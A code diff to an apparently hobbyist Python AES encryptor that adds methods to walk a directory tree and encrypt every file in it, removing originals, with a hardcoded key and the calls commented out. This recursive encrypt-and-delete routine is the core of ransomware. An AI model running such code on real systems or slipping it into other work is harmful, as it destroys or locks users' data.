@@ -1,6 +1,5 @@
 from Crypto import Random
 import os.path
-from os.path import isfile
 
 import os;
 from Crypto.Cipher import AES;
@@ -44,33 +43,35 @@ class Encryptor:
             file.close();
         os.remove(file_name);
 
+    def get_file_list(self, location, avoid_files=[]):
+        file_list = [];
+        for dir_name, sub_dir_list, dir_file_list in os.walk(location):
+            if(".git" in sub_dir_list):
+                    sub_dir_list.remove(".git");
+            for file in dir_file_list:
+                if(file not in avoid_files):
+                    file_list.append(os.path.join(dir_name, file));
+        return file_list;
+
+
+    def encrypt_location(self, location=os.path.dirname(os.path.realpath(__file__))):
+        avoid_files = [__file__, "README.md", "enc-dec.py"];
+        file_list = self.get_file_list(location, avoid_files);
+        for file in file_list:
+            self.encrypt_file(file);
+
+    def decrypt_location(self, location=os.path.dirname(os.path.realpath(__file__))):
+        avoid_files = [__file__, "README.md", "enc-dec.py"];
+        file_list = self.get_file_list(location, avoid_files);
+        for file in file_list:
+            self.decrypt_file(file);
 
 key = b'[EX\xc8\xd5\xbfI{\xa2$\x05(\xd5\x18\xbf\xc0\x85)\x10nc\x94\x02)j\xdf\xcb\xc4\x94\x9d(\x9e';
 encryptor = Encryptor(key);
-#encryptor.encrypt_file("some text.txt");
-#encryptor.decrypt_file("some text.txt.woz");
+#encryptor.encrypt_location();
+#encryptor.decrypt_location();
 
 """
-    def getAllFiles(self):
-        dir_path = os.path.dirname(os.path.realpath(__file__))
-        dirs = []
-        for dirName, subdirList, fileList in os.walk(dir_path):
-            for fname in fileList:
-                if (fname != 'enc-dec.py' and fname != 'data.txt.enc'):
-                    dirs.append(dirName + "\\" + fname)
-        return dirs
-
-    def encrypt_all_files(self):
-        dirs = self.getAllFiles()
-        for file_name in dirs:
-            self.encrypt_file(file_name)
-
-    def decrypt_all_files(self):
-        dirs = self.getAllFiles()
-        for file_name in dirs:
-            self.decrypt_file(file_name)
-
-
 key = b'[EX\xc8\xd5\xbfI{\xa2$\x05(\xd5\x18\xbf\xc0\x85)\x10nc\x94\x02)j\xdf\xcb\xc4\x94\x9d(\x9e'
 enc = Encryptor(key)
 clear = lambda: os.system('cls')
